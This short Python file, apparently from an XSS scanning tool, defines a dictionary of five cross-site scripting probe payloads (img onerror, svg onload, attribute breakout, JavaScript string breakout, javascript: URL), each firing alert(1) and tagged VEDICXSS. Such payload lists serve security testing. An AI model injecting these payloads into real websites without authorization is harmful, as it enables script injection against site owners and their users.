# core/payloads.py

PAYLOADS = {
    "html": '<img src=x onerror=alert(1)>VEDICXSS',
    "svg": '<svg/onload=alert(1)>VEDICXSS',
    "attr": '" autofocus onfocus=alert(1) x="VEDICXSS',
    "js": "');alert(1);//VEDICXSS",
    "url": "javascript:alert(1)"
}
